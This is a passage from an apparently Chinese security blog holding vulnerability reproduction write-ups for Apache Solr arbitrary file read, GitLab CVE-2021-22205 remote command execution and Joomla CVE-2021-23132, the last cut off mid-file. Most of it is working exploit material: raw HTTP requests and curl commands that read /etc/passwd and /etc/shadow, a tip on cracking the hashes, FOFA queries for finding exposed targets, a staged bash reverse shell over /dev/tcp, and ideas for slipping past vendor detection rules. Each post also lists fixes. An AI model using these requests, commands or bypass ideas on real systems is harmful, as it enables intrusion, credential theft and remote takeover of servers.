User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Connection: close
Content-Length: 82

&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>当出现”This response format is experimental.  It is likely to change in the future.” 表示存在漏洞。</p>
<p>进行文件读取</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
Host: 192.168.xxx.xxx:8983
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Connection: close
Content-Length: 35
Content-Type: application&#x2F;x-www-form-urlencoded

stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>也可以读取shadow文件然后进行john爆破出密码</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
Host: 192.168.xxx.xxx:8983
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Connection: close
Content-Length: 35
Content-Type: application&#x2F;x-www-form-urlencoded

stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"></p>
<h4 id="Exploit②"><a href="#Exploit②" class="headerlink" title="Exploit②"></a>Exploit②</h4><pre class="line-numbers language-none"><code class="language-none">curl -d &#39;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39; http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;config -H &#39;Content-type:application&#x2F;json&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"></p>
<pre class="line-numbers language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot; -F &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;root&#x2F;a.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以读取被攻击的主机文件<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
<h4 id="Exploit-POC"><a href="#Exploit-POC" class="headerlink" title="Exploit_POC"></a>Exploit_POC</h4><p><a href="https://github.com/Henry4E36/Solr">https://github.com/Henry4E36/Solr</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>由于目前官方不予修复该漏洞，暂无安全版本。</p>
<ol>
<li>开启身份验证/授权</li>
<li>配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问</li>
<li>禁止将Apache Solr放置在外网</li>
</ol>
<h3 id="厂商防护及绕过思路"><a href="#厂商防护及绕过思路" class="headerlink" title="厂商防护及绕过思路"></a>厂商防护及绕过思路</h3><p>这种组件直接放内网就好了，或者一定配置身份校验，且Solr路由写的比较死，厂商提取规则时只要将url过滤完整即可，不会存在绕过情况。</p>
<p>绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，core的名称包含在url中，且生产环境中为用户自定义，很多规则编写者通常只将示例example加入检测，可绕过几率很高。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ">https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ</a><br><a href="https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg">https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg</a><br><a href="https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw">https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.1</tag>
      </tags>
  </entry>
  <entry>
    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
<pre class="line-numbers language-none"><code class="language-none">反弹shell：

python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
这条语句意思是代表，对写入成功的sh脚本加执行权限
python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.11</tag>
      </tags>
  </entry>
  <entry>
    <title>【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现</title>
    <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。<br>本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p>
<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N<br>漏洞等级：7.5 | 高危</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>3.0.0 &lt;= Joomla! &lt;= 3.9.24</p>
<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/HoangKien1020/CVE-2021-23132">https://github.com/HoangKien1020/CVE-2021-23132</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞复现环境在本地搭建，首先从<a href="https://downloads.joomla.org/zh-cn/">官网</a>下载安装包，我这里使用了Joomla_3.9.22模板。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>直接在php集成环境下安装即可，附上<a href="https://www.bilibili.com/video/BV1Mt411A7V4?p=7">B站链接</a>。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>Joomla！在安装过程中会提示新建超级管理员，当然，在该超级管理员权限下是可以直接getshell的，因为权限很大。<br>该漏洞是在一般普通管理员的身份下，存在网站目录下的任意文件目录遍历，而导致的远程代码执行漏洞。所以该漏洞的利用前提需要有一个普通管理员的权限。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在创建好系统后，进入后台管理，登录超级管理员用户，创建一个普通管理员用户（创建时勾选Administrator）。后面复现在该用户权限下实现目录遍历与RCE。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>首先以新创建的普通管理员身份登录系统。切换到“多媒体文件管理”。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>保存后，回到“多媒体文件管理”，可以看到这里可以操作整个web目录下的文件夹及文件。实现了目录遍历。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>然后进入到administrator/components/com_users目录下，删掉config.xml文件，并重新上传一个新的config.xml文件，其内容如下。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;config&gt;
  &lt;fieldset 
    name&#x3D;&quot;user_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_USER_OPTIONS&quot; &gt;
    &lt;field
      name&#x3D;&quot;allowUserRegistration&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;new_usertype&quot;
      type&#x3D;&quot;usergrouplist&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC&quot;
      default&#x3D;&quot;2&quot;
      checksuperusergroup&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;guest_usergroup&quot;
      type&#x3D;&quot;usergrouplist&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC&quot;
      default&#x3D;&quot;1&quot;
      checksuperusergroup&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;sendpassword&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;useractivation&quot;
      type&#x3D;&quot;list&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNONE&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;2&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;mail_to_admin&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;captcha&quot;
      type&#x3D;&quot;plugins&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_DESC&quot;
      folder&#x3D;&quot;captcha&quot;
      filter&#x3D;&quot;cmd&quot;
      useglobal&#x3D;&quot;true&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JOPTION_DO_NOT_USE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;frontend_userparams&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;site_language&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      showon&#x3D;&quot;frontend_userparams:1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;change_login_name&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;domain_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_DOMAIN_OPTIONS&quot;
    &gt;

    &lt;field
      name&#x3D;&quot;domains&quot;
      type&#x3D;&quot;subform&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_DESC&quot;
      multiple&#x3D;&quot;true&quot;
      layout&#x3D;&quot;joomla.form.field.subform.repeatable-table&quot;
      formsource&#x3D;&quot;administrator&#x2F;components&#x2F;com_users&#x2F;models&#x2F;forms&#x2F;config_domain.xml&quot;
    &#x2F;&gt;
  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;password_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_PASSWORD_OPTIONS&quot; &gt;
    &lt;field
      name&#x3D;&quot;reset_count&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;20&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;10&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;reset_time&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_DESC&quot;
      first&#x3D;&quot;1&quot;
      last&#x3D;&quot;24&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;1&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_length&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH_DESC&quot;
      first&#x3D;&quot;4&quot;
      last&#x3D;&quot;99&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;4&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_integers&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_symbols&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS_DESC&quot;
